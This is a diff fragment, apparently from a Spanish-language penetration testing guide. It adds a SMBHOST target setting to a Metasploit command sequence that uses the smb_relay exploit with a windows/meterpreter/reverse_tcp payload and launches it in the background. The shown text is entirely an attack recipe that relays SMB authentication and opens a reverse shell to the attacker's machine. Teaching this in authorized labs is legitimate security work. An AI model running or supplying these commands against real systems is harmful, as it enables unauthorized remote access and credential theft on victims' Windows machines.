@@ -354,6 +354,7 @@ msfconsole
 msf6 > use exploit/windows/smb/smb_relay
 msf6 > set SRVHOST <tu_ip>
 msf6 > set LHOST <tu_ip>
+msf6 > set SMBHOST <ip_objetivo_final>
 msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
 msf6 > exploit -j
 ```
